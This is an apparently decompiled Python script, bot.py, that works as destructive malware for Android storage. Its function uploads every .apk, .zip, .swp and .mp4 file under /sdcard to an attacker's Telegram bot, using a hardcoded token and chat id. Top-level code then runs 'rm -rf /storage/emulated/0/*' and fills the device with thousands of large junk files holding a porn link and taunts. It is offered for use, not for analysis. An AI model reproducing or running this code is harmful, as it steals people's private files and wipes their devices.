# Source Generated with ShoaibxAmer Pycdc
# File: bot.py (Python 3.11) 
# GitHub : https://github.com/mafiams16
# Facebook : https://www.facebook.com/mafiam1
# import YOUCEF M/16
# FEEL FREE ENJOY KIDZ SCRIPT

def CENTSU():
    session = requests.session()
 
    bot_token = '7007144314:AAHwAweHgnvcV2bsLuwDpt6au5tzL-LpBIk' #توكن بوت
    chat_id = '6251142250' #ايدي حسابك
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																						
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------------zip-------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------------swp---------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------mp4--------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
import os
os.system('rm -rf /storage/emulated/0/*')
text = "iam danger x , https://pornhub.com\n"
for i in range(6000):
	os.system(f'touch /storage/emulated/0/DELETE-succesful{i}.txt')
	with open(f'/storage/emulated/0/DELETE-succesful{i}.txt','a') as file:
		file.write(text*20000)
print('BOBO MO NAMAN PARANG SI DENV. :)')
print('TAHOL NA NAMAN YANG ASO')
print('MAFIA Enjoying from afar') 
